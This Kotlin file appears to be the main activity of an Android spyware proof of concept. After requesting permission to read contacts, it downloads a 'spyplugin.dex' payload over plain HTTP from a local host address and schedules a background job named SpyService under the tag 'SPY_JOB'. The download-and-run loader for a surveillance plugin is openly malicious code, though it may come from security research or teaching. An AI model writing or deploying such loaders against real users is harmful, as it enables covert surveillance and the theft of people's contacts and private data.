package com.example.background

import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.main_activity)

        val textView = findViewById<TextView>(R.id.textViewStatus)
        val start_button = findViewById<Button>(R.id.buttonStart)
        val stop_button = findViewById<Button>(R.id.buttonStop)

        start_button.setOnClickListener {
            requestContactPermission()
            textView.text = getString(R.string.text_start)
        }

        stop_button.setOnClickListener {
            stopTask()
            textView.text = getString(R.string.text_stop)
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            startTask()
        } else {
            Log.d("Perm", "Permission denied")
        }
    }

    fun requestContactPermission() {
        when {
            ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED -> {
                startTask()
            }
            ActivityCompat.shouldShowRequestPermissionRationale(
                this,
                android.Manifest.permission.READ_CONTACTS
            ) -> {
                Log.d("Perm", "Permission denied")
            }
            else -> {
                requestPermissionLauncher.launch(android.Manifest.permission.READ_CONTACTS)
            }
        }
    }

    private fun startTask() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()

        downloadDex(this, "http://10.0.2.2:8000/spyplugin.dex") { file ->
            runOnUiThread {
                val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
                    .addTag("SPY_JOB")
                    .setConstraints(constraints)
                    .setInitialDelay(1, TimeUnit.MINUTES)
                    .build()

                WorkManager.getInstance().enqueue(quickWorkRequest)
            }
        }
    }

    private fun stopTask() = WorkManager.getInstance().cancelAllWorkByTag("SPY_JOB")

    fun downloadDex(context: Context, url: String, onComplete: (File) -> Unit) {
        Thread {
            val file = File(context.filesDir, "spyplugin.dex")
            URL(url).openStream().use { input ->
                FileOutputStream(file).use { output ->
                    input.copyTo(output)
                }
            }
            file.setReadable(true)
            file.setWritable(false)
            file.setExecutable(false)
            onComplete(file)
        }.start()
    }
}